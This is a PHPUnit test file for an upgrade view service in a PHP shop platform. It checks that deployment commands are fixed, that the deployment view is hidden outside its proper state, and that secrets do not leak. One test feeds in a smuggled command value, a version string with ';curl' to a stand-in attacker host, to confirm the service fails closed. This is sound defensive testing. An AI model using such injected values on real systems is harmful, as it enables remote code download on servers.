<?php

declare(strict_types=1);

namespace Tests\Unit\Upgrade;

use app\service\upgrade\UpgradeSessionAuthStore;
use app\service\upgrade\UpgradeSharedFileStore;
use app\service\upgrade\UpgradeViewService;
use PHPUnit\Framework\TestCase;
use think\App;

final class UpgradeViewServiceTest extends TestCase
{
    private const AGENT_UID = 39001;
    private const SHARED_GID = 39002;
    private const PHP_UID = 39003;
    private const INSTANCE_ID = 'd3ec761b-c5d1-4663-8c76-7d2d351efad5';
    private const CREATE_REQUEST = '11111111-1111-4111-8111-111111111111';
    private const JOB_ID = '22222222-2222-4222-8222-222222222222';

    private string $root;
    private App $app;
    private UpgradeSharedFileStore $files;
    private UpgradeSessionAuthStore $sessions;
    private string $owner;
    private string $sessionId;
    private string $jobState = 'awaiting_deployment';

    protected function setUp(): void
    {
        parent::setUp();
        $this->app = new App(dirname(__DIR__, 3));
        $this->app->initialize();
        $this->app->config->set(['enabled' => false], 'upgrade');
        $this->root = sys_get_temp_dir() . '/mallbase-upgrade-view-' . bin2hex(random_bytes(8));
        mkdir($this->root, 0750, true);
        foreach (['run', 'jobs'] as $directory) {
            mkdir($this->root . '/' . $directory, 02770);
            chmod($this->root . '/' . $directory, 02770);
        }
        chmod($this->root, 0750);
        $this->files = new UpgradeSharedFileStore(
            $this->root,
            self::AGENT_UID,
            self::SHARED_GID,
            self::PHP_UID,
            65536,
            50,
            $this->statOperations(),
        );
        $this->sessions = new UpgradeSessionAuthStore($this->files);
        $key = rtrim(strtr(base64_encode(str_repeat("\x42", 32)), '+/', '-_'), '=');
        $created = $this->sessions->create(self::INSTANCE_ID, $key, 1, self::CREATE_REQUEST, 1000);
        $this->sessions->confirm(
            $key,
            $created['owner_cookie'],
            self::CREATE_REQUEST,
            $created['confirmation_nonce'],
            1001,
        );
        $this->owner = $created['owner_cookie'];
        $this->sessionId = $created['session_id'];
    }

    protected function tearDown(): void
    {
        $this->removeTree($this->root);
        parent::tearDown();
    }

    public function testAwaitingDeploymentProjectsOnlyFixedRelativeInstructionsAndVerifiedTarget(): void
    {
        $principal = $this->bindJob('1.2.3');
        $status = $this->service()->status($principal + ['csrf_nonce' => 'nonce']);

        self::assertSame('1.2.3', $status['deployment']['target_version']);
        self::assertSame(
            'sh deploy/docker/build-sealed-image.sh',
            $status['deployment']['commands']['build'],
        );
        self::assertSame(
            'sh deploy/docker/start-sealed-image.sh <32位 receipt id>',
            $status['deployment']['commands']['start'],
        );
        self::assertCount(3, $status['deployment']['steps']);
        self::assertCount(3, $status['deployment']['risks']);
        $projection = json_encode($status['deployment'], JSON_THROW_ON_ERROR | JSON_UNESCAPED_UNICODE);
        self::assertStringNotContainsString($this->root, $projection);
        self::assertStringNotContainsString('https://shop.example.com', $projection);
        self::assertStringNotContainsString(str_repeat('A', 43), $projection);
        self::assertStringNotContainsString('artifact', strtolower($projection));
    }

    public function testDeploymentProjectionIsHiddenOutsideAwaitingDeployment(): void
    {
        $principal = $this->bindJob('1.2.3');
        $this->jobState = 'applying';

        self::assertNull($this->service()->status($principal)['deployment']);
    }

    public function testMaliciousTargetVersionFailsClosedWithoutLeakingIntoProjection(): void
    {
        $target = '1.2.3;curl https://attacker.invalid/x';
        $principal = $this->bindJob($target);
        $status = $this->service()->status($principal);

        self::assertSame('awaiting_deployment', $status['job']['state']);
        self::assertNull($status['deployment']);
        self::assertStringNotContainsString($target, json_encode($status, JSON_THROW_ON_ERROR));
    }

    /** @return array<string,mixed> */
    private function bindJob(string $targetVersion): array
    {
        return $this->sessions->bindJob(
            $this->owner,
            self::JOB_ID,
            2,
            1002,
            function () use ($targetVersion): void {
                $this->files->publishJobRequest(self::JOB_ID, (object) [
                    'schema_version' => 1,
                    'job_id' => self::JOB_ID,
                    'instance_id' => self::INSTANCE_ID,
                    'current_version' => '1.1.0',
                    'current_storage_layout_version' => 1,
                    'target_version' => $targetVersion,
                    'requested_by_admin_id' => 42,
                    'requested_at' => 1002,
                    'callback_base_url' => 'https://shop.example.com',
                    'capability_token' => str_repeat('A', 43),
                    'expected_revision' => 1,
                ]);
            },
        );
    }

    private function service(): UpgradeViewService
    {
        return new UpgradeViewService(
            $this->files,
            $this->sessions,
            fn(string $jobId): ?array => $jobId === self::JOB_ID ? [
                'job_id' => self::JOB_ID,
                'revision' => 7,
                'state' => $this->jobState,
                'next_step' => 'operator_deployment',
                'failure_class' => '',
                'platform_sync_pending' => false,
                'platform_receipt_confirmed' => false,
                'safe_to_stop' => false,
                'updated_at' => 1003,
                'allowed_actions' => [],
            ] : null,
        );
    }

    /** @return array<string,callable> */
    private function statOperations(): array
    {
        return [
            'lstat' => function (string $path): array|false {
                $stat = @lstat($path);
                if ($stat === false) {
                    return false;
                }
                $stat['gid'] = self::SHARED_GID;
                $stat['uid'] = $this->expectedOwner($path, ($stat['mode'] & 0170000) === 0040000);

                return $stat;
            },
            'fstat' => function ($handle): array|false {
                $stat = fstat($handle);
                if ($stat === false) {
                    return false;
                }
                $path = (string) (stream_get_meta_data($handle)['uri'] ?? '');
                $stat['gid'] = self::SHARED_GID;
                $stat['uid'] = $this->expectedOwner($path, ($stat['mode'] & 0170000) === 0040000);

                return $stat;
            },
        ];
    }

    private function expectedOwner(string $path, bool $directory): int
    {
        if ($directory || str_ends_with($path, '/run/session-auth.json')
            || str_ends_with($path, '/run/session-auth.lock')
            || str_ends_with($path, '/status.json')) {
            return self::AGENT_UID;
        }

        return self::PHP_UID;
    }

    private function removeTree(string $path): void
    {
        if (!file_exists($path) && !is_link($path)) {
            return;
        }
        if (is_file($path) || is_link($path)) {
            @chmod($path, 0660);
            @unlink($path);

            return;
        }
        foreach (scandir($path) ?: [] as $entry) {
            if ($entry !== '.' && $entry !== '..') {
                $this->removeTree($path . '/' . $entry);
            }
        }
        @chmod($path, 0770);
        @rmdir($path);
    }
}
